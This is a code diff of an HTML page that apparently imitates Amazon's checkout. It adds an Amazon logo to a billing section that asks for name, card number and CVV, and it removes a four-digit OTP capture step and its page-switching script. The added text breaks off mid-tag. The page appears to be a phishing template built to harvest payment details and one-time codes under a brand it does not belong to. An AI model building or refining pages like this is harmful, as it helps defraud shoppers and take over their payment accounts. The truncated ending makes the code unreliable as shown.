@@ -43,7 +43,7 @@
         }
 
         .header img {
-            max-width: 120px;
+            max-width: 140px;
             height: auto;
             margin-bottom: 20px;
         }
@@ -120,10 +120,12 @@
             display: flex;
             gap: 20px;
             margin: 20px 0;
+            justify-content: center;
         }
 
         .payment-methods img {
             max-width: 100px;
+            height: auto;
             cursor: pointer;
         }
 
@@ -180,6 +182,10 @@
     <!-- Billing Page Section -->
     <div class="section" id="billing-section">
         <h1>Billing Information</h1>
+        <div class="header">
+            <!-- Amazon logo added to billing page -->
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">
+        </div>
         <div class="section-title">Enter your billing details</div>
         <form onsubmit="showPaymentPage(event)">
             <input type="text" id="fullName" name="fullName" class="input-field" placeholder="Full Name" required>
@@ -210,6 +216,7 @@
             </div>
             <input type="text" id="cvv" name="cvv" class="input-field" placeholder="CVV" required>
             <div class="payment-methods">
+                <!-- PayPal, Visa, and MasterCard icons -->
                 <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/PayPal_logo_2014.svg" alt="PayPal" title="Pay with PayPal">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/4/47/Visa_2014_logo.svg" alt="Visa" title="Pay with Visa">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/MasterCard_Logo_2019.svg" alt="MasterCard" title="Pay with MasterCard">
@@ -221,69 +228,4 @@
     <!-- OTP Verification Page Section -->
     <div class="section" id="otp-section">
         <h1>Enter the OTP sent to your phone number</h1>
-        <div class="section-title">We have sent a one-time password (OTP) to your mobile number. Please enter the OTP below to continue.</div>
-        <form onsubmit="verifyOTP(event)">
-            <div style="display: flex; gap: 10px;">
-                <input type="text" id="otp1" name="otp1" class="input-field" maxlength="1" required>
-                <input type="text" id="otp2" name="otp2" class="input-field" maxlength="1" required>
-                <input type="text" id="otp3" name="otp3" class="input-field" maxlength="1" required>
-                <input type="text" id="otp4" name="otp4" class="input-field" maxlength="1" required>
-            </div>
-            <button type="submit" class="submit-btn">Verify OTP</button>
-        </form>
-        <div class="resend-otp">
-            <p>Didn't receive the OTP? <a href="#" onclick="resendOTP()">Resend OTP</a></p>
-        </div>
-    </div>
-
-</div>
-
-<script>
-    // Function to show Billing Page after login
-    function showBillingPage(event) {
-        event.preventDefault();
-        document.getElementById("login-section").classList.remove("active");
-        document.getElementById("billing-section").classList.add("active");
-    }
-
-    // Function to show Payment Page after billing information
-    function showPaymentPage(event) {
-        event.preventDefault();
-        document.getElementById("billing-section").classList.remove("active");
-        document.getElementById("payment-section").classList.add("active");
-    }
-
-    // Function to show OTP Page after payment information
-    function showOtpPage(event) {
-        event.preventDefault();
-        document.getElementById("payment-section").classList.remove("active");
-        document.getElementById("otp-section").classList.add("active");
-    }
-
-    // Function to verify OTP
-    function verifyOTP(event) {
-        event.preventDefault();
-        const otp = [
-            document.getElementById('otp1').value,
-            document.getElementById('otp2').value,
-            document.getElementById('otp3').value,
-            document.getElementById('otp4').value
-        ];
-
-        const otpString = otp.join('');
-        if (otpString.length === 4 && !otp.includes("")) {
-            alert('OTP verified successfully!');
-            // Proceed to confirmation or next step (e.g., order completion)
-        } else {
-            alert('Please enter a valid OTP.');
-        }
-    }
-
-    // Function to simulate resending the OTP
-    function resendOTP() {
-        alert('A new OTP has been sent to your phone number.');
-    }
-</script>
-
-</body>
-</html>
+        <
